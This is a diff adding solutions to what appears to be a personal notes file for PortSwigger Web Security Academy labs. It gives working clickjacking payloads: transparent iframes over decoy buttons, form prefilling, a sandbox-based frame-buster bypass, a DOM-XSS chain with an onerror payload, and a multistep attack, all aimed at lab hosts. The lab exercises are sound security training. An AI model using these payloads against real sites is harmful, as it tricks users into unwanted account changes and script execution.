@@ -1565,13 +1565,139 @@ curl -L -k -x 127.0.0.1:8080 --cookie 'session=jhDhbpkpWYLfS9HVTLGS6pDBh6PydHYo'
 
     https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
 
+Solution:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:495px;
+        left:70px;
+        z-index: 1;
+    }
+</style>
+<div>click me</div>
+<iframe src="https://0a3a00b004f0a545823629f2002c003e.web-security-academy.net/my-account"></iframe>
+```
+
 ### Lab: Clickjacking with form input data prefilled from a URL parameter
 
     https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
 
+Solution:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:70px;
+        z-index: 1;
+    }
+</style>
+<div>click me</div>
+<iframe src="https://0a0a007a0426b22481bb0cc7009d00b3.web-security-academy.net/my-account?email=eat@this.man"></iframe>
+```
+
 ### Lab: Clickjacking with a frame buster script
 
     https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
+
+Solution:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:530px;
+        left:75px;
+        z-index: 1;
+    }
+</style>
+<div>click me</div>
+<iframe src="https://0ac600f403d0b36d80cc49c800fd00de.web-security-academy.net/my-account?email=abc@xyz.com" sandbox="allow-forms"></iframe>
+```
+
+### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+    https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
+
+Solution:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 1000px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:790px;
+        left:70px;
+        z-index: 1;
+    }
+</style>
+<div>click me</div>
+<iframe src="https://0a7400270324b4218066b7f500d20071.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=%27print()%27/%3E&email=abc@xyz.com&subject=abc&message=xyz"></iframe>
+```
+
+### Lab: Multistep clickjacking
+
+    https://portswigger.net/web-security/clickjacking/lab-multistep
+
+Solution:
+
+```
+<style>
+    .frame1 {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    .click1 {
+        position:absolute;
+        top:495px;
+        left:70px;
+        z-index: 1;
+    }
+
+    .click2 {
+        position:absolute;
+        top:300px;
+        left:200px;
+        z-index: 1;
+    }
+</style>
+<div class="click1">Click me first</div>
+<div class="click2">Click me next</div>
+<iframe class="frame1" src="https://0a15001c0368c65d8033e933004e0061.web-security-academy.net/my-account"></iframe>
+```
 
 ## JWT
 
